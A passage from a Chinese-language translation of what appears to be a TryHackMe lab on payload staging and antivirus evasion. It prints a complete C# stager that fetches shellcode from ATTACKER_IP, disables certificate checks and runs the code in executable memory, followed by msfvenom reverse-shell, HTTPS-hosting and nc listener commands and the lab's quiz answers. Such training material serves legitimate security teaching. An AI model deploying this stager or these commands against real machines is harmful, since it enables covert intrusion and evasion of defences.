\u65e0\u9636\u6bb5"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u51b3\u5b9a\u4f7f\u7528\u54ea\u79cd\u7c7b\u578b\u7684\u6709\u6548\u8f7d\u8377\u65f6\uff0c\u6211\u4eec\u5fc5\u987b\u4e86\u89e3\u653b\u51fb\u73af\u5883\u3002\u6839\u636e\u5177\u4f53\u653b\u51fb\u573a\u666f\u7684\u4e0d\u540c\uff0c\u6bcf\u79cd\u6709\u6548\u8f7d\u8377\u7c7b\u578b\u90fd\u6709\u5176\u4f18\u7f3a\u70b9\u3002"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"\u65e0\u9636\u6bb5\u6709\u6548\u8f7d\u8377\u7684\u4f18\u52bf\uff1a"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5305\u542b\u4f7f shellcode \u8fd0\u884c\u6240\u9700\u7684\u5168\u90e8\u5185\u5bb9"}),"\n",(0,l.jsx)(n.li,{children:"\u65e0\u9700\u989d\u5916\u7f51\u7edc\u8fde\u63a5\u5373\u53ef\u6267\u884c\u3002\u7f51\u7edc\u4ea4\u4e92\u8d8a\u5c11\uff0c\u88ab IPS \u68c0\u6d4b\u5230\u7684\u6982\u7387\u8d8a\u4f4e"}),"\n",(0,l.jsx)(n.li,{children:"\u82e5\u653b\u51fb\u76ee\u6807\u7f51\u7edc\u8fde\u63a5\u53d7\u9650\uff0c\u53ef\u5c06\u6574\u4e2a\u6709\u6548\u8f7d\u8377\u5c01\u88c5\u4e3a\u5355\u4e00\u6587\u4ef6"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"\u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377\u7684\u4f18\u52bf\uff1a"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u78c1\u76d8\u5360\u7528\u5c0f\u3002stage0 \u4ec5\u8d1f\u8d23\u4e0b\u8f7d\u6700\u7ec8 shellcode\uff0c\u4f53\u79ef\u901a\u5e38\u5f88\u5c0f"}),"\n",(0,l.jsx)(n.li,{children:"\u6700\u7ec8 shellcode \u4e0d\u5d4c\u5165\u53ef\u6267\u884c\u6587\u4ef6\u3002\u82e5\u6709\u6548\u8f7d\u8377\u88ab\u6355\u83b7\uff0c\u84dd\u961f\u53ea\u80fd\u83b7\u53d6 stage0 \u5b58\u6839"}),"\n",(0,l.jsx)(n.li,{children:"\u6700\u7ec8 shellcode \u5728\u5185\u5b58\u4e2d\u52a0\u8f7d\uff0c\u6c38\u4e0d\u63a5\u89e6\u78c1\u76d8\u3002\u964d\u4f4e\u88ab\u6740\u6bd2\u8f6f\u4ef6\u68c0\u6d4b\u7684\u53ef\u80fd\u6027"}),"\n",(0,l.jsx)(n.li,{children:"\u540c\u4e00 stage0 \u91ca\u653e\u5668\u53ef\u590d\u7528\u591a\u79cd shellcode\uff0c\u53ea\u9700\u66ff\u6362\u53d1\u9001\u7ed9\u76ee\u6807\u673a\u5668\u7684\u6700\u7ec8 shellcode"}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.strong,{children:"\u603b\u7ed3\uff1a"}),"\r\n\u4e24\u79cd\u7c7b\u578b\u5404\u6709\u4f18\u52a3\uff0c\u9700\u7ed3\u5408\u5177\u4f53\u573a\u666f\u9009\u62e9\u3002\u65e0\u9636\u6bb5\u6709\u6548\u8f7d\u8377\u66f4\u9002\u5408\u8fb9\u754c\u9632\u62a4\u4e25\u5bc6\u7684\u7f51\u7edc\u73af\u5883\uff08\u65e0\u9700\u4ece\u4e92\u8054\u7f51\u4e0b\u8f7d\u6700\u7ec8 shellcode\uff09\u3002\u4f8b\u5982\u5728\u5c01\u95ed\u7f51\u7edc\u4e2d\u6267\u884c USB \u6446\u6e21\u653b\u51fb\u65f6\uff0c\u65e0\u9636\u6bb5\u6709\u6548\u8f7d\u8377\u662f\u66f4\u597d\u7684\u9009\u62e9\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377\u5219\u9002\u5408\u8ffd\u6c42\u6700\u5c0f\u5316\u672c\u5730\u75d5\u8ff9\u7684\u573a\u666f\u3002\u7531\u4e8e\u6700\u7ec8\u8f7d\u8377\u5728\u5185\u5b58\u6267\u884c\uff0c\u90e8\u5206\u6740\u6bd2\u8f6f\u4ef6\u66f4\u96be\u68c0\u6d4b\u3002\u540c\u65f6\u53ef\u907f\u514d\u66b4\u9732\u7cbe\u5fc3\u6784\u9020\u7684 shellcode\uff08shellcode \u5168\u7a0b\u4e0d\u4f1a\u4ee5\u6587\u4ef6\u5f62\u5f0f\u51fa\u73b0\u5728\u76ee\u6807\u78c1\u76d8\uff09"}),"\n",(0,l.jsx)(n.h3,{id:"metasploit\u4e2d\u7684\u5206\u9636\u6bb5\u8f7d\u8377",children:"Metasploit\u4e2d\u7684\u5206\u9636\u6bb5\u8f7d\u8377"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4f7f\u7528msfvenom\u521b\u5efa\u6709\u6548\u8f7d\u8377\u6216\u5728Metasploit\u4e2d\u76f4\u63a5\u4f7f\u7528\u65f6\uff0c\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u5206\u9636\u6bb5\uff08staged\uff09\u6216\u65e0\u9636\u6bb5\uff08stageless\uff09\u8f7d\u8377\u3002\u4f8b\u5982\uff0c\u82e5\u9700\u751f\u6210\u53cd\u5411TCP shell\uff0c\u60a8\u4f1a\u53d1\u73b0\u5b58\u5728\u4e24\u4e2a\u540d\u79f0\u7565\u6709\u5dee\u5f02\u7684\u5bf9\u5e94\u8f7d\u8377\uff08\u6ce8\u610f\u659c\u6760\u540e\u7684\u5dee\u5f02\uff09\uff1a_/shell"}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{style:{textAlign:"left"},children:"\u8f7d\u8377\u540d\u79f0"}),(0,l.jsx)(n.th,{style:{textAlign:"left"},children:"\u7c7b\u578b"})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"windows/x64/shell_reverse_tcp"}),(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"\u65e0\u9636\u6bb5\u8f7d\u8377"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"windows/x64/shell/reverse_tcp"}),(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"\u5206\u9636\u6bb5\u8f7d\u8377"})]})]})]}),"\n",(0,l.jsxs)(n.p,{children:["\u901a\u5e38\u53ef\u89c1\u76f8\u540c\u547d\u540d\u6a21\u5f0f\u9002\u7528\u4e8e\u5176\u4ed6\u7c7b\u578bshell\u3002\u4f8b\u5982\uff0c\u4f7f\u7528\u65e0\u9636\u6bb5Meterpreter\u65f6\uff0c\u6211\u4eec\u5e94\u9009\u62e9",(0,l.jsx)(n.code,{children:"windows/x64/meterpreter_reverse_tcp"}),"\u800c\u975e\u5176\u5206\u9636\u6bb5\u7248\u672c",(0,l.jsx)(n.code,{children:"windows/x64/meterpreter/reverse_tcp"}),"\u3002"]}),"\n",(0,l.jsx)(n.h3,{id:"\u521b\u5efa\u81ea\u5b9a\u4e49\u5206\u9636\u6bb5\u8f7d\u8377",children:"\u521b\u5efa\u81ea\u5b9a\u4e49\u5206\u9636\u6bb5\u8f7d\u8377"}),"\n",(0,l.jsxs)(n.p,{children:["\u6784\u5efa\u5206\u9636\u6bb5\u8f7d\u8377\u65f6\uff0c\u6211\u4eec\u91c7\u7528@mvelazc0\u63d0\u4f9b\u7684\u5206\u9636\u6bb5\u4ee3\u7801\u7a0d\u4f5c\u4fee\u6539\u3002\u5b8c\u6574\u7684\u5206\u9636\u6bb5\u8f7d\u8377\u4ee3\u7801\u53ef\u5728\u6b64\u5904\u83b7\u53d6\uff0c\u4e5f\u53ef\u901a\u8fc7\u60a8Windows\u8bbe\u5907\u7684",(0,l.jsx)(n.code,{children:"C:\\Tools\\CS Files\\StagedPayload.cs"}),"\u8def\u5f84\u8bbf\u95ee\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:'using System;\r\nusing System.Net;\r\nusing System.Text;\r\nusing System.Configuration.Install;\r\nusing System.Runtime.InteropServices;\r\nusing System.Security.Cryptography.X509Certificates;\r\n\r\npublic class Program {\r\n  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc \r\n  [DllImport("kernel32")]\r\n  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\r\n\r\n  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread\r\n  [DllImport("kernel32")]\r\n  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\r\n\r\n  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject\r\n  [DllImport("kernel32")]\r\n  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\r\n\r\n  private static UInt32 MEM_COMMIT = 0x1000;\r\n  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\r\n\r\n  public static void Main()\r\n  {\r\n    string url = "https://ATTACKER_IP/shellcode.bin";\r\n    Stager(url);\r\n  }\r\n\r\n  public static void Stager(string url)\r\n  {\r\n\r\n    WebClient wc = new WebClient();\r\n    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\r\n    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;\r\n\r\n    byte[] shellcode = wc.DownloadData(url);\r\n\r\n    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\r\n    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);\r\n\r\n    IntPtr threadHandle = IntPtr.Zero;\r\n    UInt32 threadId = 0;\r\n    IntPtr parameter = IntPtr.Zero;\r\n    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\r\n\r\n    WaitForSingleObject(threadHandle, 0xFFFFFFFF);\r\n\r\n  }\r\n}\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u8be5\u4ee3\u7801\u521d\u770b\u53ef\u80fd\u4ee4\u4eba\u671b\u800c\u751f\u754f\uff0c\u4f46\u5176\u7ed3\u6784\u76f8\u5bf9\u7b80\u660e\u3002\u8ba9\u6211\u4eec\u9010\u6b65\u89e3\u6790\u5176\u529f\u80fd\u3002"}),"\n",(0,l.jsxs)(n.p,{children:["\u4ee3\u7801\u9996\u90e8\u901a\u8fc7P/Invoke\u5bfc\u5165\u82e5\u5e72Windows API\u51fd\u6570\u3002\u6211\u4eec\u9700\u8981\u4ece",(0,l.jsx)(n.code,{children:"kernel32.dll"}),"\u4e2d\u8c03\u7528\u7684\u4e09\u4e2a\u6838\u5fc3\u51fd\u6570\u5982\u4e0b\uff1a"]}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{style:{textAlign:"left"},children:(0,l.jsx)(n.strong,{children:"WinAPI\u51fd\u6570"})}),(0,l.jsx)(n.th,{style:{textAlign:"left"},children:(0,l.jsx)(n.strong,{children:"\u529f\u80fd\u63cf\u8ff0"})})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{style:{textAlign:"left"},children:(0,l.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc",children:"VirtualAlloc()"})}),(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"\u4e3ashellcode\u5206\u914d\u9884\u7559\u5185\u5b58\u7a7a\u95f4"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{style:{textAlign:"left"},children:(0,l.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread",children:"CreateThread()"})}),(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u521b\u5efa\u6267\u884c\u7ebf\u7a0b"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{style:{textAlign:"left"},children:(0,l.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject",children:"WaitForSingleObject()"})}),(0,l.jsx)(n.td,{style:{textAlign:"left"},children:"\u5b9e\u73b0\u7ebf\u7a0b\u540c\u6b65\u673a\u5236\uff0c\u4f7f\u5f53\u524d\u7ebf\u7a0b\u7b49\u5f85\u76ee\u6807\u7ebf\u7a0b\u6267\u884c\u5b8c\u6bd5\u540e\u518d\u7ee7\u7eed\u8fd0\u884c"})]})]})]}),"\n",(0,l.jsx)(n.p,{children:"\u4ee5\u4e0b\u4ee3\u7801\u6bb5\u8d1f\u8d23\u5b9e\u73b0\u8fd9\u4e9b\u51fd\u6570\u7684\u52a8\u6001\u8c03\u7528\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:'//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc \r\n[DllImport("kernel32")]\r\nprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\r\n\r\n//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread\r\n[DllImport("kernel32")]\r\nprivate static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\r\n\r\n//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject\r\n[DllImport("kernel32")]\r\nprivate static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u4ee3\u7801\u7684\u6838\u5fc3\u903b\u8f91\u4f4d\u4e8e",(0,l.jsx)(n.code,{children:"Stager()"}),"\u51fd\u6570\u5185\uff0c\u8be5\u51fd\u6570\u5b9e\u73b0\u4e86\u5206\u9636\u6bb5\u8f7d\u8377\u7684\u6838\u5fc3\u673a\u5236\u3002\u6b64\u51fd\u6570\u63a5\u6536\u4e00\u4e2aURL\u53c2\u6570\uff0c\u7528\u4e8e\u6307\u5b9a\u5f85\u6267\u884cshellcode\u7684\u4e0b\u8f7d\u5730\u5740\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u5728",(0,l.jsx)(n.code,{children:"Stager()"}),"\u51fd\u6570\u521d\u59cb\u9636\u6bb5\uff0c\u9996\u5148\u5b9e\u4f8b\u5316",(0,l.jsx)(n.code,{children:"WebClient()"}),"\u5bf9\u8c61\u4ee5\u4fbf\u901a\u8fc7Web\u8bf7\u6c42\u4e0b\u8f7dshellcode\u3002\u5728\u5b9e\u9645\u53d1\u8d77\u8bf7\u6c42\u524d\uff0c\u6211\u4eec\u9700\u91cd\u5199",(0,l.jsx)(n.code,{children:"ServerCertificateValidationCallback"}),"\u65b9\u6cd5\u2014\u2014\u8be5\u65b9\u6cd5\u7528\u4e8eHTTPS\u8bf7\u6c42\u7684SSL\u8bc1\u4e66\u9a8c\u8bc1\u3002\u901a\u8fc7\u8986\u5199\u6b64\u65b9\u6cd5\uff0cWebClient\u5c06\u4e0d\u4f1a\u5bf9\u6258\u7ba1payload\u7684Web\u670d\u52a1\u5668\u4f7f\u7528\u7684\u81ea\u7b7e\u540d\u6216\u65e0\u6548\u8bc1\u4e66\u53d1\u51fa\u8b66\u544a\u3002\u5b8c\u6210\u8bc1\u4e66\u9a8c\u8bc1\u8bbe\u7f6e\u540e\uff0c\u8c03\u7528",(0,l.jsx)(n.code,{children:"DownloadData()"}),"\u65b9\u6cd5\u4ece\u6307\u5b9aURL\u4e0b\u8f7dshellcode\u5e76\u5b58\u5165",(0,l.jsx)(n.code,{children:"shellcode"}),"\u53d8\u91cf\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:"WebClient wc = new WebClient();\r\nServicePointManager.ServerCertificateValidationCallback = delegate { return true; };\r\nServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;\r\n\r\nbyte[] shellcode = wc.DownloadData(url);\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u4e00\u65e6\u6211\u4eec\u7684 shellcode \u88ab\u4e0b\u8f7d\u5e76\u5b58\u50a8\u5728 ",(0,l.jsx)(n.code,{children:"shellcode"})," \u53d8\u91cf\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u590d\u5236\u5230\u53ef\u6267\u884c\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u518d\u6267\u884c\u5b83\u3002\u6211\u4eec\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"VirtualAlloc()"})," \u5411\u64cd\u4f5c\u7cfb\u7edf\u8bf7\u6c42\u4e00\u4e2a\u5185\u5b58\u5757\u3002\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u8bf7\u6c42\u8db3\u591f\u7684\u5185\u5b58\u6765\u5206\u914d ",(0,l.jsx)(n.code,{children:"shellcode.Length"})," \u5b57\u8282\uff0c\u5e76\u8bbe\u7f6e ",(0,l.jsx)(n.code,{children:"PAGE_EXECUTE_READWRITE"})," \u6807\u5fd7\uff0c\u4f7f\u5206\u914d\u7684\u5185\u5b58\u53ef\u6267\u884c\u3001\u53ef\u8bfb\u548c\u53ef\u5199\u3002\u5f53\u6211\u4eec\u7684\u53ef\u6267\u884c\u5185\u5b58\u5757\u88ab\u4fdd\u7559\u5e76\u5206\u914d\u7ed9 ",(0,l.jsx)(n.code,{children:"codeAddr"})," \u53d8\u91cf\u540e\uff0c\u6211\u4eec\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"Marshal.Copy()"})," \u5c06 ",(0,l.jsx)(n.code,{children:"shellcode"})," \u53d8\u91cf\u7684\u5185\u5bb9\u590d\u5236\u5230 ",(0,l.jsx)(n.code,{children:"codeAddr"})," \u53d8\u91cf\u4e2d\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:"UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\r\nMarshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u5c06 shellcode \u590d\u5236\u5230\u4e00\u5757\u53ef\u6267\u884c\u5185\u5b58\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"CreateThread()"})," \u51fd\u6570\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u521b\u5efa\u4e00\u4e2a\u65b0\u7ebf\u7a0b\u6765\u6267\u884c\u6211\u4eec\u7684 shellcode\u3002\u4f20\u9012\u7ed9 CreateThread \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5411 ",(0,l.jsx)(n.code,{children:"codeAddr"}),"\uff0c\u5373\u5b58\u50a8 shellcode \u7684\u4f4d\u7f6e\uff0c\u56e0\u6b64\u5f53\u7ebf\u7a0b\u542f\u52a8\u65f6\uff0c\u4f1a\u50cf\u8c03\u7528\u666e\u901a\u51fd\u6570\u4e00\u6837\u8fd0\u884c shellcode \u7684\u5185\u5bb9\u3002\u7b2c\u4e94\u4e2a\u53c2\u6570\u88ab\u8bbe\u4e3a 0\uff0c\u8868\u793a\u7ebf\u7a0b\u5c06\u7acb\u5373\u5f00\u59cb\u6267\u884c\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:["\u7ebf\u7a0b\u521b\u5efa\u540e\uff0c\u6211\u4eec\u8c03\u7528 ",(0,l.jsx)(n.code,{children:"WaitForSingleObject()"})," \u51fd\u6570\uff0c\u6307\u793a\u5f53\u524d\u7a0b\u5e8f\u5728\u7ee7\u7eed\u6267\u884c\u4e4b\u524d\u5fc5\u987b\u7b49\u5f85\u8be5\u7ebf\u7a0b\u6267\u884c\u5b8c\u6bd5\u3002\u8fd9\u53ef\u4ee5\u9632\u6b62\u7a0b\u5e8f\u5728 shellcode \u7ebf\u7a0b\u6709\u673a\u4f1a\u8fd0\u884c\u4e4b\u524d\u5c31\u63d0\u524d\u5173\u95ed\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c#",children:"IntPtr threadHandle = IntPtr.Zero;\r\nUInt32 threadId = 0;\r\nIntPtr parameter = IntPtr.Zero;\r\nthreadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);\r\n\r\nWaitForSingleObject(threadHandle, 0xFFFFFFFF);\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e3a\u4e86\u7f16\u8bd1\u4ee3\u7801\uff0c\u6211\u4eec\u5efa\u8bae\u5c06\u5176\u590d\u5236\u5230\u4e00\u53f0 Windows \u673a\u5668\u4e0a\uff0c\u4fdd\u5b58\u4e3a\u540d\u4e3a staged-payload.cs \u7684\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-PowerShell",children:"PS C:\\> csc staged-payload.cs\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528\u6211\u4eec\u7684\u5f15\u5bfc\u7a0b\u5e8f\u8fd0\u884c\u53cd\u5411-shell",children:"\u4f7f\u7528\u6211\u4eec\u7684\u5f15\u5bfc\u7a0b\u5e8f\u8fd0\u884c\u53cd\u5411 shell"}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u65e6\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u88ab\u7f16\u8bd1\u5b8c\u6210\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a web \u670d\u52a1\u5668\u6765\u6258\u7ba1\u6700\u7ec8\u7684 shellcode\u3002\u8bb0\u4f4f\uff0c\u6211\u4eec\u7684\u5f15\u5bfc\u7a0b\u5e8f\u5c06\u8fde\u63a5\u5230\u8fd9\u4e2a\u670d\u52a1\u5668\u4ee5\u83b7\u53d6 shellcode\uff0c\u5e76\u5728\u53d7\u5bb3\u8005\u673a\u5668\u7684\u5185\u5b58\u4e2d\u6267\u884c\u5b83\u3002\u9996\u5148\uff0c\u6211\u4eec\u751f\u6210\u4e00\u4e2a shellcode\uff08\u6587\u4ef6\u540d\u9700\u8981\u4e0e\u5f15\u5bfc\u7a0b\u5e8f\u4e2d\u7684 URL \u5339\u914d\uff09\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\\x00\\x0a\\x0d'\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662f raw \u683c\u5f0f\u7684 shellcode\uff0c\u56e0\u4e3a\u5f15\u5bfc\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u5c06\u5176\u4e0b\u8f7d\u5230\u5185\u5b58\u4e2d\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u6709\u4e86 shellcode\uff0c\u63a5\u4e0b\u6765\u8bbe\u7f6e\u4e00\u4e2a\u7b80\u5355\u7684 HTTPS \u670d\u52a1\u5668\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u81ea\u7b7e\u540d\u8bc1\u4e66\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7cfb\u7edf\u4f1a\u8981\u6c42\u8f93\u5165\u4e00\u4e9b\u4fe1\u606f\uff0c\u4f46\u53ef\u4ee5\u6309\u56de\u8f66\u952e\u8df3\u8fc7\u4efb\u4f55\u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u9700\u8981 SSL \u8bc1\u4e66\u662f\u6709\u6548\u7684\u3002\u62e5\u6709 SSL \u8bc1\u4e66\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u901a\u8fc7 python3 \u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684 HTTPS \u670d\u52a1\u5668\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ python3 -c \"import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()\"\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e00\u5207\u51c6\u5907\u5c31\u7eea\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u5f15\u5bfc\u7a0b\u5e8f\u6709\u6548\u8f7d\u8377\u3002\u5f15\u5bfc\u7a0b\u5e8f\u5e94\u8be5\u8fde\u63a5\u5230 HTTPS \u670d\u52a1\u5668\u5e76\u83b7\u53d6 shellcode.bin \u6587\u4ef6\uff0c\u5c06\u5176\u52a0\u8f7d\u5230\u5185\u5b58\u5e76\u5728\u53d7\u5bb3\u8005\u673a\u5668\u4e0a\u6267\u884c\u3002\u8bb0\u5f97\u8bbe\u7f6e\u4e00\u4e2a nc \u76d1\u542c\u5668\uff0c\u4ee5\u4fbf\u5728\u8fd0\u884c msfvenom \u65f6\u6307\u5b9a\u7684\u76f8\u540c\u7aef\u53e3\u4e0a\u63a5\u6536\u53cd\u5411 shell\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"user@AttackBox$ nc -lvp 7474\n"})}),"\n",(0,l.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsx)(n.p,{children:"\u5206\u9636\u6bb5\u8f7d\u8377\u662f\u5426\u4f1a\u4e00\u6b21\u6027\u4ea4\u4ed8\u5b8c\u6574\u7684\u8f7d\u8377\u5185\u5bb9\uff1f (yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"nay\n"})}),(0,l.jsxs)(n.p,{children:["Metasploit \u7684",(0,l.jsx)(n.code,{children:"windows/x64/meterpreter_reverse_https"}),"\u8f7d\u8377\u662f\u5206\u9636\u6bb5\u8f7d\u8377\u5417\uff1f (yea/nay)"]}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"nay\n"})}),(0,l.jsx)(n.p,{children:"\u5206\u6bb5\u6709\u6548\u8f7d\u8377\u7684 stage0 \u662f\u5426\u8d1f\u8d23\u4e0b\u8f7d\u5f85\u6267\u884c\u7684\u6700\u7ec8\u6709\u6548\u8f7d\u8377\uff1f (yea/nay)"}),(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"yea\n"})}),(0,l.jsxs)(n.p,{children:["\u8bf7\u6309\u7167\u8bf4\u660e\u521b\u5efa\u4e00\u4e2a\u5206\u6bb5\u6709\u6548\u8f7d\u8377\uff0c\u5e76\u5c06\u5176\u4e0a\u4f20\u81f3",(0,l.jsx)(n.code,{children:"http://10.10.14.106/"}),"\u7684 THM Antivirus Check"]})]}),"\n",(0,l.jsx)(n.h2,{id:"introduction-to-encoding-and-encryption---\u7f16\u7801\u4e0e\u52a0\u5bc6\u7b80\u4ecb",children:"Introduction to Encoding and Encryption - \u7f16\u7801\u4e0e\u52a0\u5bc6\u7b80\u4ecb"}),"\n",(0,l.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f\u7f16\u7801",children:"\u4ec0\u4e48\u662f\u7f16\u7801\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"\u7f16\u7801\u662f\u5c06\u6570\u636e\u4ece\u5176\u539f\u59cb\u72b6\u6001\u6839\u636e\u7b97\u6cd5\u6216\u7f16\u7801\u7c7b\u578b\u8f6c\u6362\u4e3a\u7279\u5b9a\u683c\u5f0f\u7684\u8fc7\u7a0b\u3002\u5b83\u53ef\u4ee5\u5e94\u7528\u4e8e\u591a\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u4f8b\u5982\u89c6\u9891\u3001HTML\u3001URL \u548c\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u5982 